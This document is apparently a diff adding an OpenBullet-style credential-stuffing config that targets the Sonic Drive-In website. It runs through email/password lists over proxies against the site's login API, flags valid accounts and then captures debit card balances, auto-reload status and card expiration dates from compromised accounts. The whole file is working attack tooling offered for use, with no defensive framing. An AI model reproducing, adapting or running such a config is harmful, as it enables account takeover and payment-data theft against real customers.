@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Sonic + Full Cap",
+  "SuggestedBots": 200,
+  "LastModified": "2018-06-07T23:28:26.0637779+00:00",
+  "AdditionalInfo": "",
+  "Author": "Rebel + Dreamzje + B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.sonicdrivein.com/jsapi/v1/auth" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.sonicdrivein.com/login?redirect=%2Faccount" 
+  HEADER "origin: https://www.sonicdrivein.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\": \"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+    KEY "Username provided is invalid" 
+PARSE "<SOURCE>" LR "\"id\": \"" "\"" Recursive=FALSE -> VAR "ID" "" "" 
+REQUEST GET "https://www.sonicdrivein.com/jsapi/v1/users/<ID>/debit_cards" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"last_balance_check_value\":" 
+PARSE "<SOURCE>" LR "last_balance_check_value\":" "\"" Recursive=TRUE -> CAP "Card Balance" "" "" 
+PARSE "<SOURCE>" LR "ad\": " "," Recursive=FALSE -> CAP "Auto Reload" "" "" 
+REQUEST GET "https://www.sonicdrivein.com/jsapi/v1/users/<ID>/payment_methods" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "h\": " "," Recursive=TRUE -> CAP "CC Expiration Month" "" "" 
+PARSE "<SOURCE>" LR "r\": " "," Recursive=TRUE -> CAP "CC Expiration year" "20" "" 
